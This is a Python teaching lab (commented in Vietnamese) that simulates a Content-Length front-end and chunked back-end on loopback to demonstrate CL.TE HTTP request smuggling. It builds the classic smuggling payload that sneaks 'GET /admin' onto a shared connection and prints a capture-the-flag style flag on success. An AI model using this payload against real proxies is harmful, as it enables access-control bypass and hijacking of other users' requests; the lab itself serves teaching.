#!/usr/bin/env python3
"""
Lab 6.4 - HTTP request smuggling (CL.TE), demo tu chua.

Request smuggling xay ra khi hai tang xu ly HTTP tren mot ket noi TCP dung
CHUNG (front-end proxy + back-end server) BAT DONG y ve bien gioi request: mot
ben tin Content-Length (CL), ben kia tin Transfer-Encoding: chunked (TE). Ke
tan cong "nhet len" (smuggle) mot request vao dau ket noi, no se bi ghep vao
request cua nan nhan ke tiep.

Demo nay mo phong ca hai tang trong MOT tien trinh (chi de hoc), bind loopback:
  - back-end  127.0.0.1:8051  : framing theo TE (chunked co uu tien hon CL).
  - front-end 127.0.0.1:8050  : framing theo CL, forward byte tho sang back-end
                                qua MOT ket noi keep-alive dung chung.

Day KHONG thay the duoc moi truong proxy phan tang that (nginx/haproxy + app),
nhung tai hien dung co che desync CL.TE va cho thay request bi smuggle thuc su
duoc back-end xu ly.

CHAY LOCAL. Khong deploy ra Internet.
"""
import socket
import threading
import time

BACK_PORT = 8051
FRONT_PORT = 8050

# Log cac request line ma BACK-END thuc su parse duoc (bang chung smuggling).
BACKEND_LOG = []


# ----------------------------------------------------------------------------
# Phan A: chung minh "bat dong framing" bang cach parse CUNG mot byte stream
# theo hai kieu. Day la hat nhan cua request smuggling, hoan toan tat dinh.
# ----------------------------------------------------------------------------
def split_headers(data: bytes):
    head, _, rest = data.partition(b"\r\n\r\n")
    headers = {}
    lines = head.split(b"\r\n")
    req_line = lines[0].decode(errors="replace") if lines else ""
    for ln in lines[1:]:
        if b":" in ln:
            k, _, v = ln.partition(b":")
            headers[k.strip().lower().decode()] = v.strip().decode()
    return req_line, headers, rest


def frame_as_CL(data: bytes):
    """Parser dung Content-Length (bo qua Transfer-Encoding)."""
    reqs = []
    while data.strip():
        req_line, headers, rest = split_headers(data)
        n = int(headers.get("content-length", "0") or "0")
        body = rest[:n]
        data = rest[n:]
        reqs.append((req_line, body))
    return reqs


def read_chunked(data: bytes):
    """Doc body chunked, tra ve (body, phan con lai sau chunk ket thuc 0)."""
    body = b""
    while True:
        line, _, data = data.partition(b"\r\n")
        try:
            size = int(line.strip(), 16)
        except ValueError:
            break
        if size == 0:
            # sau '0' con mot CRLF ket thuc trailer
            if data.startswith(b"\r\n"):
                data = data[2:]
            break
        body += data[:size]
        data = data[size:]
        if data.startswith(b"\r\n"):
            data = data[2:]
    return body, data


def frame_as_TE(data: bytes):
    """Parser dung Transfer-Encoding: chunked (uu tien hon CL)."""
    reqs = []
    while data.strip():
        req_line, headers, rest = split_headers(data)
        if headers.get("transfer-encoding", "").lower() == "chunked":
            body, rest = read_chunked(rest)
        else:
            n = int(headers.get("content-length", "0") or "0")
            body, rest = rest[:n], rest[n:]
        reqs.append((req_line, body))
        data = rest
    return reqs


def demo_part_a():
    print("=" * 64)
    print("PHAN A: cung 1 byte stream, hai tang frame ra KHAC NHAU (CL.TE)")
    print("=" * 64)
    # Payload CL.TE kinh dien:
    #   Content-Length bao trum ca phan smuggled (front dung CL se doc het).
    #   Transfer-Encoding: chunked voi chunk '0' ket thuc som (back dung TE
    #   se dung o day, phan con lai thanh request moi).
    smuggled = b"GET /admin HTTP/1.1\r\nHost: back\r\nFoo: bar"
    body = b"0\r\n\r\n" + smuggled
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: front\r\n"
        b"Content-Length: %d\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n" % len(body)
    ) + body

    print("\n[payload tho gui vao]")
    print(payload.decode(errors="replace"))

    print("\n[front-end frame theo Content-Length] -> thay %d request:" %
          len(frame_as_CL(payload)))
    for rl, b in frame_as_CL(payload):
        print("   req:", rl, "| body %d byte" % len(b))

    te = frame_as_TE(payload)
    print("\n[back-end frame theo Transfer-Encoding] -> thay %d request:" %
          len(te))
    for rl, b in te:
        print("   req:", rl, "| body %d byte" % len(b))
    print("\n=> Front thay 1 request; back thay 2 (co them 'GET /admin' bi "
          "smuggle).")


# ----------------------------------------------------------------------------
# Phan B: demo SONG: dung back-end (TE) + front-end (CL) that, forward qua MOT
# ket noi keep-alive dung chung, cho thay request smuggle duoc back-end xu ly.
# ----------------------------------------------------------------------------
def recv_headers(conn, buf):
    while b"\r\n\r\n" not in buf:
        chunk = conn.recv(4096)
        if not chunk:
            return None, buf
        buf += chunk
    return buf, buf


def backend_handler(conn):
    """Back-end: framing theo TE (chunked uu tien), keep-alive, log moi request."""
    buf = b""
    conn.settimeout(2.0)
    try:
        while True:
            # lay du header
            while b"\r\n\r\n" not in buf:
                chunk = conn.recv(4096)
                if not chunk:
                    return
                buf += chunk
            req_line, headers, rest = split_headers(buf)
            if headers.get("transfer-encoding", "").lower() == "chunked":
                # can doc du chunk; neu thieu byte thi recv them
                while True:
                    body, leftover = read_chunked(rest)
                    if b"0\r\n" in rest:  # da thay chunk ket thuc
                        break
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    rest += chunk
                rest = leftover
            else:
                n = int(headers.get("content-length", "0") or "0")
                while len(rest) < n:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    rest += chunk
                rest = rest[n:]
            BACKEND_LOG.append(req_line)
            resp_body = ("xu ly: %s" % req_line).encode()
            conn.sendall(
                b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n"
                % len(resp_body) + resp_body
            )
            buf = rest
    except socket.timeout:
        return
    except Exception:
        return


def run_backend(ready):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BACK_PORT))
    srv.listen(5)
    ready.set()
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=backend_handler, args=(conn,), daemon=True).start()


# Front-end dung MOT ket noi keep-alive toi back-end cho moi request (pooling).
_back_conn = None
_back_lock = threading.Lock()


def backend_conn():
    global _back_conn
    if _back_conn is None:
        _back_conn = socket.create_connection(("127.0.0.1", BACK_PORT))
        _back_conn.settimeout(1.0)
    return _back_conn


def front_handler(conn):
    """Front-end: framing theo CL, forward byte tho sang back-end dung chung."""
    buf = b""
    conn.settimeout(2.0)
    try:
        while b"\r\n\r\n" not in buf:
            chunk = conn.recv(4096)
            if not chunk:
                return
            buf += chunk
        req_line, headers, rest = split_headers(buf)
        n = int(headers.get("content-length", "0") or "0")  # FRONT dung CL
        while len(rest) < n:
            chunk = conn.recv(4096)
            if not chunk:
                break
            rest += chunk
        head = buf.split(b"\r\n\r\n", 1)[0]
        forwarded = head + b"\r\n\r\n" + rest[:n]
        with _back_lock:
            bc = backend_conn()
            bc.sendall(forwarded)
            # doc phan hoi co san (co the lech do desync - minh hoa poisoning)
            time.sleep(0.2)
            resp = b""
            try:
                while True:
                    d = bc.recv(4096)
                    if not d:
                        break
                    resp += d
            except socket.timeout:
                pass
        conn.sendall(resp if resp else b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
    except Exception:
        pass
    finally:
        conn.close()


def run_frontend(ready):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", FRONT_PORT))
    srv.listen(5)
    ready.set()
    while True:
        conn, _ = srv.accept()
        front_handler(conn)  # xu ly tuan tu de thay ro thu tu attacker -> victim


def send_raw(port, data, wait=0.4):
    s = socket.create_connection(("127.0.0.1", port))
    s.settimeout(2.0)
    s.sendall(data)
    time.sleep(wait)
    out = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def demo_part_b():
    print("\n" + "=" * 64)
    print("PHAN B: demo song - front(CL) + back(TE) dung chung 1 ket noi")
    print("=" * 64)
    rb, rf = threading.Event(), threading.Event()
    threading.Thread(target=run_backend, args=(rb,), daemon=True).start()
    rb.wait(2)
    threading.Thread(target=run_frontend, args=(rf,), daemon=True).start()
    rf.wait(2)
    time.sleep(0.3)

    smuggled = b"GET /admin HTTP/1.1\r\nHost: back\r\nFoo: bar"
    body = b"0\r\n\r\n" + smuggled
    attacker = (
        b"POST / HTTP/1.1\r\nHost: front\r\n"
        b"Content-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n" % len(body)
    ) + body

    print("\n[1] Ke tan cong gui request CL.TE qua front-end...")
    send_raw(FRONT_PORT, attacker, wait=0.5)
    print("    back-end log sau buoc 1:", BACKEND_LOG)
    print("    (phan 'GET /admin' con nam trong buffer back-end, cho request ke tiep)")

    victim = b"GET /home HTTP/1.1\r\nHost: front\r\n\r\n"
    print("\n[2] Nan nhan gui request binh thuong 'GET /home' qua front-end...")
    send_raw(FRONT_PORT, victim, wait=0.5)
    print("    back-end log sau buoc 2:", BACKEND_LOG)

    smuggled_hit = any("/admin" in x for x in BACKEND_LOG)
    print("\n=> Back-end da xu ly request 'GET /admin' KHONG ai gui truc tiep: %s"
          % ("CO (smuggling thanh cong)" if smuggled_hit else "khong"))
    return smuggled_hit


if __name__ == "__main__":
    demo_part_a()
    ok = demo_part_b()
    print("\n" + "=" * 64)
    print("KET LUAN: %s" % (
        "FLAG{6.4_request_smuggling_CL.TE_desync}" if ok else
        "Demo song khong on dinh tren may nay; xem Phan A (tat dinh) va ly thuyet."))
    print("=" * 64)
